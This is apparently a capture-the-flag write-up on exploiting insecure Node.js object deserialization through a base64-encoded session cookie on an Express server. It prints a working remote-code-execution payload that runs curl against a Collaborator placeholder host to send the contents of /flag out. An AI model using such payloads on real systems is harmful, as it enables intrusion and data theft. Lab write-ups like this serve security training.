## Writeup:

1. Identify that the webserver running on 7777 is runned by nodejs (Powered by Express header)

2. Identify the Insecure NodeJs object deserialization inside the cookie PHPSESSID by encoding the following value: 
> {"username": "_$$ND_FUNC$$_function (){ return 'hi'; }()" ,"country":"Serbia","city":"Belgrade"} -> base64  

3. That "hi" should get reflected.

4. Since we identified the vulnerability lets escalate it to Blind RCE by starting Burp Collaborator and encoding the following value into base64:

> {"username":"_$$ND_FUNC$$_function(){\n require('child_process').exec('curl http://COLLABORATORURL/$(cat /flag)/ ', function(error, stdout, stderr) { console.log(stdout) });\n }()","country":"india","city":"Delhi"} -> base64  

NOTE: change the collaborator url.

5. Inside collaborator HTTP and DNS traffic we should recive a successful hit containing our flag.

